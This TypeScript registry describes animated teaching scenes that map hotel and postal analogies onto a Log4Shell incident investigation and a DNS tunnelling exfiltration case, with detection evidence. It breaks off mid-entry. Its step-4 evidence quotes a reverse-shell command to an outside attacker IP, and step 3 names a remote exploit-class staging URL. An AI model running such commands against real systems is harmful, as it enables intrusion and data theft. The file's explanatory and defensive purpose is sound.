import type { Section3DDescriptor, Section3DKey } from '@/lib/section-3d-registry';

/**
 * Bespoke 3D Story-to-Technical Section Descriptors for NETWORK_WEB (30 scenarios).
 */
export const NETWORK_WEB_3D_REGISTRY: Record<
  string,
  Partial<Record<Section3DKey, Section3DDescriptor>>
> = {
  "log4shell-dfir": {
    "briefing": {
      "scenarioId": "log4shell-dfir",
      "sectionKey": "briefing",
      "sceneKind": "net-log4shell-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace) — Story-to-Technical Overview",
      "storyCue": "A hotel reception clerk writes every guest badge note verbatim into a smart ledger that automatically phones any directory number printed on the paper. A visitor hands over a slip listing an outside phone bureau, so the clerk dials out, fetches an unsigned instruction booklet from a street kiosk, and hands the master phone line to the caller.",
      "technicalCue": "INITIAL ACCESS: INJECT JNDI PAYLOAD IN HTTP HEADER -> EXECUTION: LOG4J JNDI EVALUATION & OUTBOUND LDAP -> EXECUTION: LDAP REFERRAL & REMOTE CLASS LOADING -> LATERAL & C2: JAVA SPAWNS /BIN/BASH REVERSE SHELL",
      "storyMappings": [
        {
          "storyTerm": "Smart reception ledger",
          "technicalTerm": "Vulnerable Log4j 2 message lookup engine",
          "tone": "amber"
        },
        {
          "storyTerm": "Guest badge note",
          "technicalTerm": "HTTP User-Agent request header",
          "tone": "sky"
        },
        {
          "storyTerm": "Outside phone bureau",
          "technicalTerm": "Attacker-controlled LDAP referral server",
          "tone": "rose"
        },
        {
          "storyTerm": "Unsigned instruction booklet",
          "technicalTerm": "Remote Java bytecode class file",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 22,
      "callouts": [
        {
          "id": "net-log4shell-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Smart reception ledger",
          "subtitle": "Vulnerable Log4j 2 message lookup engine",
          "tone": "amber"
        },
        {
          "id": "net-log4shell-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Guest badge note",
          "subtitle": "HTTP User-Agent request header",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "INJECT JNDI PAYLOAD IN HTTP HEADER",
          "storyExcerpt": "The visitor walks up to the front desk and presents a paper badge note containing a special lookup code instead of a normal guest name. The desk clerk copies the entire line directly into the smart…",
          "technicalParallel": "Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info(\"Failed login from UA: \" + userAgent) (recording client metadata for security audit trails).",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5.5
        },
        {
          "id": 2,
          "shortLabel": "2. Note",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "LOG4J JNDI EVALUATION & OUTBOUND LDAP",
          "storyExcerpt": "As soon as the ledger reads the special lookup code, its built-in dialer automatically places an outgoing call through the lobby switchboard to the outside phone bureau printed on the slip.",
          "technicalParallel": "JNDI supports pluggable directory protocols including LDAP, RMI, and DNS.",
          "accentHex": "#22D3EE",
          "startSec": 5.5,
          "endSec": 11
        },
        {
          "id": 3,
          "shortLabel": "3. Slip",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "LDAP REFERRAL & REMOTE CLASS LOADING",
          "storyExcerpt": "The outside phone bureau does not give a simple name; instead, it hands back a forwarding slip pointing to a nearby street kiosk. The trusting clerk walks over to that kiosk and carries back an unsigned…",
          "technicalParallel": "When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to…",
          "accentHex": "#F43F5E",
          "startSec": 11,
          "endSec": 16.5
        },
        {
          "id": 4,
          "shortLabel": "4. Page",
          "stageTag": "STAGE 04 · LATERAL & C2",
          "title": "JAVA SPAWNS /BIN/BASH REVERSE SHELL",
          "storyExcerpt": "The clerk opens the cover page of the instruction booklet, which triggers a built-in setup checklist before any chapter is even read. Following that opening page, the clerk picks up the hotel back-office…",
          "technicalParallel": "By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName()…",
          "accentHex": "#10B981",
          "startSec": 16.5,
          "endSec": 22
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Reception Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Phone Bureau",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Courier Line",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "log4shell-dfir",
      "sectionKey": "step-1",
      "sceneKind": "net-log4shell-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Sending the \"${jndi:ldap://...}\" String Inside an HTTP Header & Triggering Logger Evaluation",
      "storyCue": "The visitor walks up to the front desk and presents a paper badge note containing a special lookup code instead of a normal guest name. The desk clerk copies the entire line directly into the smart ledger without checking whether the note contains a directory command.",
      "technicalCue": "T1190 · INITIAL ACCESS — The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression…",
      "storyMappings": [
        {
          "storyTerm": "Front desk counter",
          "technicalTerm": "Public web application login endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Paper badge note",
          "technicalTerm": "Crafted User-Agent HTTP header string",
          "tone": "sky"
        },
        {
          "storyTerm": "Special lookup code",
          "technicalTerm": "JNDI lookup expression (CVE-2021-44228)",
          "tone": "rose"
        },
        {
          "storyTerm": "Smart reception ledger",
          "technicalTerm": "Log4j 2 logging library formatter",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-log4shell-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Front desk counter",
          "subtitle": "Public web application login endpoint",
          "tone": "amber"
        },
        {
          "id": "net-log4shell-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Paper badge note",
          "subtitle": "Crafted User-Agent HTTP header string",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Front desk counter",
          "storyExcerpt": "The visitor walks up to the front desk and presents a paper badge note containing a special lookup code instead of a normal guest name.",
          "technicalParallel": "Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info(\"Failed login from UA: \" + userAgent) (recording client metadata for security audit trails).",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Note",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Paper badge note",
          "storyExcerpt": "The desk clerk copies the entire line directly into the smart ledger without checking whether the note contains a directory command.",
          "technicalParallel": "The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Code",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Smart reception ledger",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across smart reception ledger while locking down special lookup code.",
          "technicalParallel": "Documented in CISA AA21-356A & Nginx Access Log (/var/log/nginx/access.log) / ModSecurity CRS Rule 944150: GET /api/v1/login returning HTTP 401 with User-Agent containing…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Reception Desk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Phone Bureau",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Courier Line",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "log4shell-dfir",
      "sectionKey": "step-2",
      "sceneKind": "net-log4shell-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server",
      "storyCue": "As soon as the ledger reads the special lookup code, its built-in dialer automatically places an outgoing call through the lobby switchboard to the outside phone bureau printed on the slip.",
      "technicalCue": "T1203 · EXECUTION — Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the \"${jndi:ldap://...}\" expression to the…",
      "storyMappings": [
        {
          "storyTerm": "Built-in ledger dialer",
          "technicalTerm": "Java Naming and Directory Interface client",
          "tone": "amber"
        },
        {
          "storyTerm": "Lobby switchboard",
          "technicalTerm": "Perimeter egress firewall",
          "tone": "sky"
        },
        {
          "storyTerm": "Outgoing phone call",
          "technicalTerm": "Outbound LDAP connection on TCP port 389",
          "tone": "rose"
        },
        {
          "storyTerm": "Outside phone bureau",
          "technicalTerm": "External rogue directory listener",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-log4shell-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Built-in ledger dialer",
          "subtitle": "Java Naming and Directory Interface client",
          "tone": "amber"
        },
        {
          "id": "net-log4shell-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Lobby switchboard",
          "subtitle": "Perimeter egress firewall",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Soon Code",
          "stageTag": "STEP 02 · SETUP",
          "title": "Built-in ledger dialer",
          "storyExcerpt": "As soon as the ledger reads the special lookup code, its built-in dialer automatically places an outgoing call through the lobby switchboard to the outside phone bureau printed on the slip.",
          "technicalParallel": "JNDI supports pluggable directory protocols including LDAP, RMI, and DNS.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Call",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Lobby switchboard",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses lobby switchboard to advance toward outgoing phone call.",
          "technicalParallel": "Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the \"${jndi:ldap://...}\" expression to the Java Naming…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Call",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Outside phone bureau",
          "storyExcerpt": "Behind the scenes, outside phone bureau captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Suricata IDS (ET EXPLOIT Apache Log4j RCE Outbound LDAP) & Zeek: internal Java server 10.20.1.15:49210 initiating unexpected outbound TCP/1389 LDAP SearchRequest (118 B) to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Reception Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Phone Bureau",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Courier Line",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1203"
    },
    "step-3": {
      "scenarioId": "log4shell-dfir",
      "sectionKey": "step-3",
      "sceneKind": "net-log4shell-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "LDAP Referral & Downloading Remote \"Exploit.class\" Bytecode Over HTTP",
      "storyCue": "The outside phone bureau does not give a simple name; instead, it hands back a forwarding slip pointing to a nearby street kiosk. The trusting clerk walks over to that kiosk and carries back an unsigned instruction booklet.",
      "technicalCue": "T1105 · EXECUTION — The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase=\"http://91.214.124.88:8888/\" and javaFactory=\"Exploit\" (directory attributes that…",
      "storyMappings": [
        {
          "storyTerm": "Forwarding slip",
          "technicalTerm": "LDAP javaCodeBase reference attribute",
          "tone": "amber"
        },
        {
          "storyTerm": "Nearby street kiosk",
          "technicalTerm": "External HTTP payload staging server",
          "tone": "sky"
        },
        {
          "storyTerm": "Unsigned instruction booklet",
          "technicalTerm": "Compiled Exploit.class Java bytecode",
          "tone": "rose"
        },
        {
          "storyTerm": "Trusting desk clerk",
          "technicalTerm": "Application JVM URLClassLoader",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-log4shell-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Forwarding slip",
          "subtitle": "LDAP javaCodeBase reference attribute",
          "tone": "amber"
        },
        {
          "id": "net-log4shell-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Nearby street kiosk",
          "subtitle": "External HTTP payload staging server",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Slip",
          "stageTag": "STEP 03 · SETUP",
          "title": "LDAP REFERRAL & REMOTE CLASS LOADING",
          "storyExcerpt": "The outside phone bureau does not give a simple name; instead, it hands back a forwarding slip pointing to a nearby street kiosk.",
          "technicalParallel": "When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Over Back",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Nearby street kiosk",
          "storyExcerpt": "The trusting clerk walks over to that kiosk and carries back an unsigned instruction booklet.",
          "technicalParallel": "The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase=\"http://91.214.124.88:8888/\" and javaFactory=\"Exploit\" (directory attributes that tell the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Desk",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Trusting desk clerk",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across trusting desk clerk while locking down unsigned instruction booklet.",
          "technicalParallel": "Documented in Zeek http.log & Suricata: Java process (10.20.1.15) receiving HTTP 200 OK (1,842 bytes, application/java-vm, CAFEBABE magic header) from http://91.214.124.88:8888/Exploit.class.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Reception Desk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Phone Bureau",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Courier Line",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1105"
    },
    "step-4": {
      "scenarioId": "log4shell-dfir",
      "sectionKey": "step-4",
      "sceneKind": "net-log4shell-step-4",
      "stageBadge": "STEP #4 · LATERAL & C2",
      "title": "Executing the Static Initializer & Spawning a \"/bin/sh\" Reverse Shell",
      "storyCue": "The clerk opens the cover page of the instruction booklet, which triggers a built-in setup checklist before any chapter is even read. Following that opening page, the clerk picks up the hotel back-office handset and opens a live private line straight to the outsider.",
      "technicalCue": "T1059.004 · LATERAL & C2 — The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner).",
      "storyMappings": [
        {
          "storyTerm": "Cover page setup checklist",
          "technicalTerm": "Java static initializer block",
          "tone": "amber"
        },
        {
          "storyTerm": "Back-office handset",
          "technicalTerm": "Spawned /bin/sh command interpreter",
          "tone": "sky"
        },
        {
          "storyTerm": "Live private line",
          "technicalTerm": "Outbound interactive reverse session",
          "tone": "rose"
        },
        {
          "storyTerm": "Hotel building staff role",
          "technicalTerm": "Application service user context",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-log4shell-step-4-left",
          "tag": "STEP 4 · FOCUS",
          "title": "Cover page setup checklist",
          "subtitle": "Java static initializer block",
          "tone": "amber"
        },
        {
          "id": "net-log4shell-step-4-right",
          "tag": "STEP 4 · ACTION",
          "title": "Back-office handset",
          "subtitle": "Spawned /bin/sh command interpreter",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page",
          "stageTag": "STEP 04 · SETUP",
          "title": "Cover page setup checklist",
          "storyExcerpt": "The clerk opens the cover page of the instruction booklet, which triggers a built-in setup checklist before any chapter is even read.",
          "technicalParallel": "By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName()…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Back-office",
          "stageTag": "STEP 04 · MECHANISM",
          "title": "Back-office handset",
          "storyExcerpt": "Following that opening page, the clerk picks up the hotel back-office handset and opens a live private line straight to the outsider.",
          "technicalParallel": "The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Live Line",
          "stageTag": "STEP 04 · EVIDENCE",
          "title": "Hotel building staff role",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across hotel building staff role while locking down live private line.",
          "technicalParallel": "Documented in Linux Auditd (SYSCALL 59 execve, pid=8912, ppid=1420, uid=1001 tomcat) & Sigma rule: /usr/bin/java spawning /bin/sh -c \"bash -i >& /dev/tcp/91.214.124.88/4444 0>&1\".",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Reception Desk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Phone Bureau",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Courier Line",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    }
  },
  "dns-tunneling-exfil": {
    "briefing": {
      "scenarioId": "dns-tunneling-exfil",
      "sectionKey": "briefing",
      "sceneKind": "net-dnstunnel-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1048.003",
      "title": "DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration — Story-to-Technical Overview",
      "storyCue": "A strict warehouse bans all delivery trucks from leaving the yard, allowing only tiny postal inquiry slips through the front mail slot. An insider breaks a thick customer ledger into coded postcard labels, mails each label as a routine address lookup, and receives brief coded replies tucked into the return postage stamps.",
      "technicalCue": "EXFIL & IMPACT: CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS -> LATERAL & C2: RECURSIVE RELAY THROUGH CORPORATE DNS SERVER -> EXFIL & IMPACT: REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND",
      "storyMappings": [
        {
          "storyTerm": "Front mail slot",
          "technicalTerm": "Permitted UDP port 53 DNS egress path",
          "tone": "amber"
        },
        {
          "storyTerm": "Coded postcard label",
          "technicalTerm": "Hex-encoded high-entropy DNS subdomain",
          "tone": "sky"
        },
        {
          "storyTerm": "Local post office relay",
          "technicalTerm": "Internal corporate recursive DNS resolver",
          "tone": "rose"
        },
        {
          "storyTerm": "Return postage stamp",
          "technicalTerm": "Authoritative DNS TXT response record",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-dnstunnel-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Front mail slot",
          "subtitle": "Permitted UDP port 53 DNS egress path",
          "tone": "amber"
        },
        {
          "id": "net-dnstunnel-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Coded postcard label",
          "subtitle": "Hex-encoded high-entropy DNS subdomain",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Mail Slot",
          "stageTag": "STAGE 01 · EXFIL & IMPACT",
          "title": "CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS",
          "storyExcerpt": "Inside the locked archive room, a rogue clerk slices a private customer sheet into tiny numbered strips and converts every letter into pairs of digits. Each coded strip becomes the street label on an…",
          "technicalParallel": "Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label.",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Card Than",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "RECURSIVE RELAY THROUGH CORPORATE DNS SERVER",
          "storyExcerpt": "The clerk drops the lookup card into the company mailroom rather than walking to the front gate. Because the gate guard trusts every bag stamped by the company mailroom, the coded inquiry sails straight…",
          "technicalParallel": "While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Post",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND",
          "storyExcerpt": "The remote district office copies the digit strip off each incoming card to rebuild the stolen customer ledger in order. It then writes a short receipt and next-task note on a return slip marked to…",
          "technicalParallel": "This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Chute",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gate Guard",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Postcard Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dns-tunneling-exfil",
      "sectionKey": "step-1",
      "sceneKind": "net-dnstunnel-step-1",
      "stageBadge": "STEP #1 · EXFIL & IMPACT",
      "title": "Chunking & Hex-Encoding Stolen Data Into High-Entropy Subdomain Queries (Sysmon Event ID 22)",
      "storyCue": "Inside the locked archive room, a rogue clerk slices a private customer sheet into tiny numbered strips and converts every letter into pairs of digits. Each coded strip becomes the street label on an outgoing postal lookup card.",
      "technicalCue": "T1048.003 · EXFIL & IMPACT — On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\\ProgramData\\sync_agent.exe…",
      "storyMappings": [
        {
          "storyTerm": "Rogue archive clerk",
          "technicalTerm": "Compromised sync_agent.exe process",
          "tone": "amber"
        },
        {
          "storyTerm": "Numbered digit strips",
          "technicalTerm": "Chunked hexadecimal subdomain labels",
          "tone": "sky"
        },
        {
          "storyTerm": "Outgoing postal lookup card",
          "technicalTerm": "DNS TXT query packet",
          "tone": "rose"
        },
        {
          "storyTerm": "External mail district",
          "technicalTerm": "Attacker-owned authoritative domain",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-dnstunnel-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Rogue archive clerk",
          "subtitle": "Compromised sync_agent.exe process",
          "tone": "amber"
        },
        {
          "id": "net-dnstunnel-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Numbered digit strips",
          "subtitle": "Chunked hexadecimal subdomain labels",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room Tiny",
          "stageTag": "STEP 01 · SETUP",
          "title": "Rogue archive clerk",
          "storyExcerpt": "Inside the locked archive room, a rogue clerk slices a private customer sheet into tiny numbered strips and converts every letter into pairs of digits.",
          "technicalParallel": "Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label.",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Each Card",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Numbered digit strips",
          "storyExcerpt": "Each coded strip becomes the street label on an outgoing postal lookup card.",
          "technicalParallel": "On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\\ProgramData\\sync_agent.exe (PID 4412…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Card",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "External mail district",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across external mail district while locking down outgoing postal lookup card.",
          "technicalParallel": "Documented in Sysmon EventID 22 (DNSEvent, which records every process-level domain lookup so defenders can tie abnormal queries back to a specific binary): ProcessId = 4412, Image =…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Chute",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gate Guard",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Postcard Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1048.003"
    },
    "step-2": {
      "scenarioId": "dns-tunneling-exfil",
      "sectionKey": "step-2",
      "sceneKind": "net-dnstunnel-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "Recursive Relay Through the Corporate DNS Server Across the Egress Firewall (Zeek dns.log)",
      "storyCue": "The clerk drops the lookup card into the company mailroom rather than walking to the front gate. Because the gate guard trusts every bag stamped by the company mailroom, the coded inquiry sails straight outside to the remote district office.",
      "technicalCue": "T1071.004 · LATERAL & C2 — Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer…",
      "storyMappings": [
        {
          "storyTerm": "Company mailroom",
          "technicalTerm": "Internal recursive DNS resolver (10.50.1.53)",
          "tone": "amber"
        },
        {
          "storyTerm": "Front gate guard",
          "technicalTerm": "Corporate egress perimeter firewall",
          "tone": "sky"
        },
        {
          "storyTerm": "Mailroom stamped bag",
          "technicalTerm": "Forwarded upstream UDP/53 recursive query",
          "tone": "rose"
        },
        {
          "storyTerm": "Remote district office",
          "technicalTerm": "External authoritative DNS nameserver",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
